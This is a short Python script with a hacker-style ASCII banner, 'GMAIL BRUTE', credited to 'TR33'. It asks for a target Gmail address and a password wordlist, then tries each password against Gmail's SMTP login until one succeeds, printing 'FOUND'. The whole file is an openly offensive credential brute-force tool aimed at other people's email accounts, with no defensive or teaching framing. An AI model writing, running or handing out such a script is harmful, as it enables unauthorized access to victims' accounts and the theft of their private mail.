import smtplib
print("""

 ██████╗ ███╗   ███╗ █████╗ ██╗██╗         ██████╗ ██████╗ ██╗   ██╗████████╗███████╗
██╔════╝ ████╗ ████║██╔══██╗██║██║         ██╔══██╗██╔══██╗██║   ██║╚══██╔══╝██╔════╝
██║  ███╗██╔████╔██║███████║██║██║         ██████╔╝██████╔╝██║   ██║   ██║   █████╗  
██║   ██║██║╚██╔╝██║██╔══██║██║██║         ██╔══██╗██╔══██╗██║   ██║   ██║   ██╔══╝  
╚██████╔╝██║ ╚═╝ ██║██║  ██║██║███████╗    ██████╔╝██║  ██║╚██████╔╝   ██║   ███████╗
 ╚═════╝ ╚═╝     ╚═╝╚═╝  ╚═╝╚═╝╚══════╝    ╚═════╝ ╚═╝  ╚═╝ ╚═════╝    ╚═╝   ╚══════╝
 𝚋𝚢:𝚔𝚘𝚒𝚗𝚎𝚝𝚟𝟸 
                    _________  _____☞𝚃𝚁𝟹𝟹☜______    ______   
                   |  _   _  ||_   __ \   / ____ `. / ____ `. 
                   |_/ | | \_|  | |__) |  `'  __) | `'  __) | 
                       | |      |  __ /   _  |__ '. _  |__ '. 
                      _| |_    _| |  \ \_| \____) || \____) | 
                     |_____|  |____| |___|\______.' \______.' 
                                    ☞𝚃𝚁𝟹𝟹☜                                                                                       
               """)

mail = str(input("\n\n\n\nGmail Target: "))
print("Your Target:"+mail)
smtp = smtplib.SMTP("smtp.gmail.com", 587)
smtp.ehlo()
smtp.starttls()
wl = str(input("Password list :"))
opf = open(wl,"r",encoding="utf-8")
print("")
for password in opf:
  try:
   smtp.login(mail, password)
   print("FOUND: "+password)
   input("")
   break
  except smtplib.SMTPAuthenticationError:
   print("TRIED~"+password)